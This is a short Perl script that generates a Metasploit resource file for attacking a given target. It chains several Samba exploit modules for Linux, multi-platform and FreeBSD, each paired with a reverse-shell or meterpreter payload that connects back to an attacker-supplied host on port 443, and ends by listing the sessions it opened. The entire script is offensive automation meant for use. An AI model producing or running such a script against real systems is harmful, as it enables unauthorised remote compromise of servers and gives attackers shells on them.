if (@ARGV < 2)
	{
	    print "Usage: ./samba_nix.pl source target > samba_nix.rc\n";
	} else {

	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	@exploits =("use exploit/linux/samba/trans2open","use exploit/linux/samba/chain_reply","use exploit/linux/samba/lsa_transnames_heap","use exploit/linux/samba/setinfopolicy_heap");
	@gen_exploits =("use exploit/multi/samba/nttrans","use exploit/multi/samba/usermap_script");

foreach $gen_exploit(@gen_exploits) {
print $gen_exploit."\n";
print "set PAYLOAD generic/shell_reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "spool off"."\n";
print "run"."\n";
print "\n";
}	
	
foreach $exploit(@exploits) {
print $exploit."\n";
print "set PAYLOAD linux/x86/meterpreter/reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "spool off"."\n";
print "run"."\n";
print "\n";
}

print "use exploit/freebsd/samba/trans2open";
print "set PAYLOAD bsd/x86/shell/reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "spool off"."\n";
print "run"."\n";
print "\n";
print "sessions -l";
	
	}
